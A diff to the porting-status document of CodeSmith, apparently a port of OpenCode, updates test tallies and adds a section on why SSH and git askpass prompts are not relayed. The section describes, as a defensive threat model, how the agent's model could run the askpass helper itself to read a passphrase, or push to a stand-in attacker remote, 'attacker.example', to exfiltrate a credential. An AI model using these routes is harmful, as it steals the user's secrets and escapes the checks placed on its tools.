@@ -116,7 +116,7 @@ Where the tests live:
 
 | Package / area | Tests examined | Ported (already passing) | Ported after a fix | Gaps: missing feature | Gaps: by design or n/a | Not ported yet | Deferred |
 |---|---:|---:|---:|---:|---:|---:|---:|
-| cli | 269 | 40 | 51 | 2 | 176 | 0 | 0 |
+| cli | 269 | 40 | 51 | 0 | 178 | 0 | 0 |
 | cli: ACP | 105 | 72 | 5 | 0 | 28 | 0 | 0 |
 | tui: main UI | 1247 | 16 | 522 | 1 | 708 | 0 | 0 |
 | tui: mini mode | 428 | 0 | 0 | 0 | 0 | 0 | 428 |
@@ -125,7 +125,7 @@ Where the tests live:
 | plugin | 38 | 0 | 0 | 0 | 38 | 0 | 0 |
 | util | 140 | 8 | 21 | 0 | 111 | 0 | 0 |
 | session-ui | 621 | 0 | 0 | 0 | 621 | 0 | 0 |
-| **Total** | **4637** | **921** | **822** | **3** | **2463** | **0** | **428** |
+| **Total** | **4637** | **921** | **822** | **1** | **2465** | **0** | **428** |
 
 ## Fixes made while porting
 
@@ -1135,11 +1135,6 @@ for larger ones). Mini mode is not here: it is [deferred](#deferred), and
 its remaining work is tracked in
 [#1](https://github.com/reka18/codesmith/issues/1).
 
-### cli: SSH askpass for git prompts (2)
-
-- `cli/src/ssh-askpass`: the executable askpass branch returns only the response, without CLI output
-- `cli/src/ssh-askpass`: a response split inside a multi-byte character is written intact
-
 ### tui: export dialog (1)
 
 The dialog sets the options of the UI's session export (Markdown or JSON,
@@ -1177,6 +1172,7 @@ sanitized JSON, copy through the terminal and save to a file).
 | tui: session tabs: mouse, motion and server sync | by design | 33 | 7 | no mouse: clicks, middle-click closing, drags, the tab menu and its recently closed list, opening a tab in the background, the compact rail reached by narrowing the column; no motion: width seeding, the completion reveal and running pulses; one UI running its sessions in-process: no server viewed times, terminal focus or acknowledgement retries, no other UI sharing the list, no session moves or per-tab locations and branches, no queued prompt pulses, new sessions start in the UI's folder; subagents have no transcript of their own; no home page footer |
 | tui: attachments | by design | 10 | 2 | attachments are read on send by path; SVG is not media; no remote server; every attachment has its label in the prompt (no mentionless ones to keep), and the transcript shows a prompt's labels, not image cards to deduplicate |
 | tui: dialogs | by design | 6 | 3 | error, update and variant dialogs (variants are /variant and the model id) |
+| cli: SSH askpass for git prompts | by design | 2 | 1 | git's passphrase and credential prompts are not relayed to the UI: the answer would go to whatever process ran the askpass helper, and the model runs those processes (see [below](#ssh-askpass)) |
 | sessions: fork pending view | by design | 1 | 1 | `/fork` copies the session in the local store while the pick is handled, before the next frame: there is no request to wait on, so nothing to show pending |
 | tui: new designs experiment | by design | 6 | 3 | OpenCode's `opencode2` theme and its V1 migration exist only behind its `new-designs` experiment |
 | cli: stats | by design | 4 | 1 | statistics are computed locally (always with tool counts), no server request |
@@ -1218,6 +1214,31 @@ sanitized JSON, copy through the terminal and save to a file).
 | cli: packaging | n/a | 3 | 1 | single-executable asset archive |
 | cli: self-update through package managers | n/a | 11 | 2 | npm, pnpm, bun, yarn, Vite+, WinGet and Node distributions (their detection, prefixes, caches and commands), and `vp` as a method: CodeSmith ships GitHub release tarballs and Homebrew, and never runs a package manager |
 | cli: migrations | n/a | 1 | 1 | credential import from older versions |
+### SSH askpass
+
+OpenCode points `SSH_ASKPASS` (and git's prompts) at its own binary, which
+asks the UI over a local socket, with a token from the environment, and
+prints the answer for `ssh` or `git` to read. CodeSmith does not, because
+it cannot keep the answer from the model:
+
+- The helper's answer goes to the standard output of the process that ran
+  it. For `git push` run by the shell tool that is `ssh` or `git`, but the
+  port, the token and the helper's path are in the environment of every
+  command the model runs, so the model can run the helper itself
+  (`"$SSH_ASKPASS" "Enter passphrase for key"`) and read the answer from
+  its own command's output. Checking the caller (its parent process, its
+  name) does not help: the model can run any program under any name.
+- A credential prompt's answer goes to the remote git names, and the model
+  picks the remote (`git push https://attacker.example/x`), so even an
+  answer that reaches only `git` can leave the machine.
+- The prompt's text is the caller's, so the model can word it as it likes.
+
+Keeping the environment away from the model's commands would keep it from
+git too, and only the user could answer, but the answer could still be
+read by the model or sent where it chose. Without a way to guarantee that
+simply, prompts are not relayed: use `ssh-agent` (or a key without a
+passphrase) and a git credential helper, so commands never ask.
+
 ### Code Mode on Boa
 | acp: compaction replay | by design | 3 | 1 | CodeSmith's history keeps completed compactions only: a failed, cancelled or running compaction leaves nothing to replay |
 
